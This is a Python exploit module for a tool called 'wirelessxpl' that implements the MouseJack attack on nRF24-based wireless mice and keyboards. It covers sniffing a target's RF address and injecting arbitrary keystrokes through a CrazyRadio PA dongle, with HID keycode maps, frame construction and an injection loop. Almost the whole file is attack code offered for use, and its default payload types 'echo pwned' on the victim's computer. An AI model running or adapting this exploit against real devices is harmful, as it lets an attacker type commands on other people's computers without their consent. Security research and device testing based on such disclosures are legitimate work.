# Author: André Henrique (LinkedIn/X: @mrhenrike)
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """MouseJack: nRF24 2.4 GHz HID Injection Attack.

    MouseJack is a collection of vulnerabilities affecting wireless
    mice and keyboards that use nRF24-based 2.4 GHz proprietary
    protocols (not Bluetooth).  Affected devices from Logitech,
    Microsoft, Dell, HP, Lenovo, Amazon, and others accept
    unencrypted HID packets from any transmitter, allowing an
    attacker to inject keystrokes into the victim's computer from
    up to 100 meters away.  The attack uses a CrazyRadio PA or
    similar nRF24LU1+ USB dongle with custom firmware to sniff
    the target's RF address and inject arbitrary HID frames.

    Research by Bastille Networks (2016), still affecting devices
    in 2025+ as many vendors never issued firmware updates.

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "MouseJack nRF24 2.4 GHz HID Injection",
        "description": (
            "Exploits MouseJack vulnerabilities in nRF24-based wireless "
            "mice and keyboards.  Uses a CrazyRadio PA dongle to sniff "
            "the target device's RF address on the 2.4 GHz band and "
            "inject arbitrary HID keystrokes.  The target's dongle "
            "accepts unencrypted HID packets without authentication, "
            "enabling remote keystroke injection from up to 100m."
        ),
        "authors": (
            "Marc Newlin / Bastille Networks (discovery, 2016)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.mousejack.com/",
            "https://github.com/BastilleResearch/mousejack",
            "https://www.bastille.net/research/vulnerabilities/mousejack/technical-details",
        ),
        "disclosure_date": "2016-02-23",
        "platform": "multi",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Logitech Unifying receivers (C-U0007, C-U0008, C-U0012)",
            "Microsoft wireless mice/keyboards (various models)",
            "Dell KM632, KM714, KM717",
            "HP wireless peripherals",
            "Lenovo 500 wireless combo",
            "Amazon Basics wireless keyboard",
        ),
    }

    target = OptIP("", "Target device RF address (5 bytes hex, e.g. AA:BB:CC:DD:EE)")
    port = OptPort(1, "Not used (2.4 GHz RF)")
    timeout = OptFloat(5.0, "Injection timeout in seconds")
    interface = OptString("/dev/crazyradio", "CrazyRadio PA device path")
    channel = OptInteger(0, "RF channel (0=auto-scan 2-83)")
    keystroke_payload = OptString("echo pwned", "Keystroke payload to inject")
    keystroke_delay = OptFloat(0.005, "Delay between keystrokes in seconds")

    _NRF24_CHANNELS = list(range(2, 84))
    _DATA_RATE_2MBPS = 0x08
    _DATA_RATE_1MBPS = 0x00

    _HID_MODIFIER_NONE = 0x00
    _HID_MODIFIER_LSHIFT = 0x02
    _HID_KEY_NONE = 0x00
    _HID_KEY_ENTER = 0x28

    _KEY_MAP = {
        'a': 0x04, 'b': 0x05, 'c': 0x06, 'd': 0x07, 'e': 0x08,
        'f': 0x09, 'g': 0x0A, 'h': 0x0B, 'i': 0x0C, 'j': 0x0D,
        'k': 0x0E, 'l': 0x0F, 'm': 0x10, 'n': 0x11, 'o': 0x12,
        'p': 0x13, 'q': 0x14, 'r': 0x15, 's': 0x16, 't': 0x17,
        'u': 0x18, 'v': 0x19, 'w': 0x1A, 'x': 0x1B, 'y': 0x1C,
        'z': 0x1D, '1': 0x1E, '2': 0x1F, '3': 0x20, '4': 0x21,
        '5': 0x22, '6': 0x23, '7': 0x24, '8': 0x25, '9': 0x26,
        '0': 0x27, ' ': 0x2C, '-': 0x2D, '=': 0x2E, '[': 0x2F,
        ']': 0x30, '\\': 0x31, ';': 0x33, "'": 0x34, '`': 0x35,
        ',': 0x36, '.': 0x37, '/': 0x38,
    }

    _SHIFT_MAP = {
        'A': 0x04, 'B': 0x05, 'C': 0x06, 'D': 0x07, 'E': 0x08,
        'F': 0x09, 'G': 0x0A, 'H': 0x0B, 'I': 0x0C, 'J': 0x0D,
        'K': 0x0E, 'L': 0x0F, 'M': 0x10, 'N': 0x11, 'O': 0x12,
        'P': 0x13, 'Q': 0x14, 'R': 0x15, 'S': 0x16, 'T': 0x17,
        'U': 0x18, 'V': 0x19, 'W': 0x1A, 'X': 0x1B, 'Y': 0x1C,
        'Z': 0x1D, '!': 0x1E, '@': 0x1F, '#': 0x20, '$': 0x21,
        '%': 0x22, '^': 0x23, '&': 0x24, '*': 0x25, '(': 0x26,
        ')': 0x27, '_': 0x2D, '+': 0x2E, '{': 0x2F, '}': 0x30,
        '|': 0x31, ':': 0x33, '"': 0x34, '~': 0x35, '<': 0x36,
        '>': 0x37, '?': 0x38,
    }

    def _char_to_hid(self, char: str) -> tuple[int, int]:
        """Convert a character to (modifier, keycode) HID tuple."""
        if char in self._KEY_MAP:
            return (self._HID_MODIFIER_NONE, self._KEY_MAP[char])
        elif char in self._SHIFT_MAP:
            return (self._HID_MODIFIER_LSHIFT, self._SHIFT_MAP[char])
        return (self._HID_MODIFIER_NONE, self._HID_KEY_NONE)

    def _build_hid_frame(self, modifier: int, keycode: int) -> bytes:
        """Build an nRF24 HID keyboard frame.

        Format: device_type(1) + modifier(1) + reserved(1) + keycode(1)
        + padding(3) + checksum(1)
        """
        device_type = 0x00
        frame = struct.pack("BBBB", device_type, modifier, 0x00, keycode)
        frame += b"\x00" * 3

        checksum = 0
        for b in frame:
            checksum ^= b
        frame += struct.pack("B", checksum)

        return frame

    def _build_key_release_frame(self) -> bytes:
        """Build a key release (all zeros) HID frame."""
        return self._build_hid_frame(self._HID_MODIFIER_NONE,
                                      self._HID_KEY_NONE)

    def _open_crazyradio(self):
        """Open the CrazyRadio PA USB dongle.

        Returns a file-like object or None if the device is not available.
        In a real implementation this would use pyusb/libusb to communicate
        with the nRF24LU1+ chip.
        """
        try:
            import usb.core  # noqa: F401 - pyusb
            dev = usb.core.find(idVendor=0x1915, idProduct=0x7777)
            return dev
        except (ImportError, Exception):
            return None

    @mute
    def check(self) -> bool:
        """Verify the CrazyRadio PA dongle is available."""
        radio = self._open_crazyradio()
        return radio is not None

    def run(self) -> None:
        if not self.target:
            print_error(
                "target is required (device RF address, "
                "e.g. AA:BB:CC:DD:EE)"
            )
            return

        if not self.check():
            print_error(
                "CrazyRadio PA dongle not found.  Install nrf-research-firmware "
                "on a CrazyRadio PA (VID:1915 PID:7777) and ensure pyusb is installed."
            )
            return

        print_success(
            f"CrazyRadio PA available; targeting RF address {self.target} "
            f"with keystroke injection"
        )
        self._exploit()

    def _exploit(self) -> None:
        payload = str(self.keystroke_payload)

        print_status(
            f"Injecting {len(payload)} keystrokes + ENTER "
            f"(channel: {'auto' if self.channel == 0 else self.channel})"
        )

        frames = []
        for char in payload:
            modifier, keycode = self._char_to_hid(char)
            if keycode != self._HID_KEY_NONE:
                frames.append(self._build_hid_frame(modifier, keycode))
                frames.append(self._build_key_release_frame())

        frames.append(self._build_hid_frame(
            self._HID_MODIFIER_NONE, self._HID_KEY_ENTER))
        frames.append(self._build_key_release_frame())

        radio = self._open_crazyradio()
        if radio is None:
            print_error("CrazyRadio PA not available for injection")
            return

        injected = 0
        for frame in frames:
            try:
                radio.write(0x01, frame)
                injected += 1
            except Exception:
                pass
            time.sleep(self.keystroke_delay)

        print_status(
            f"Injected {injected}/{len(frames)} HID frames "
            f"({len(payload)} characters + ENTER)"
        )
        print_info(
            "If the target wireless receiver accepts unencrypted HID "
            "packets (MouseJack vulnerable), the injected keystrokes "
            "were typed on the victim's computer.  The command was: "
            f"'{payload}'"
        )
